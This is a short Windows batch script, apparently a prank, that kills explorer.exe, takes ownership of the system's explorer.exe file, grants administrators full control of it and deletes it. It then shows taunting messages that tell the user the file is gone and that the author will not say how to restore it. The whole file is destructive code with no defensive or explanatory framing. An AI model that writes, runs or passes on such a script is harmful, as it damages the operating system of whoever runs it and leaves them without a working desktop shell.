@echo off
taskkill /IM explorer.exe /F
takeown /A /F %systemdrive%\Windows\explorer.exe
icacls %systemdrive%\Windows\explorer.exe /grant administrators:f
del /F /Q %systemdrive%\Windows\explorer.exe
cls
echo Your explorer.exe is GONE!!!
pause
cls
echo It is nearly IMPOSSIBLE to restore now!
pause
cls
echo But there is a way to restore it.
pause
cls
echo BUT I'M NOT TELLING YOU!!!
pause
cls
echo Goodbye, %username%!
pause
exit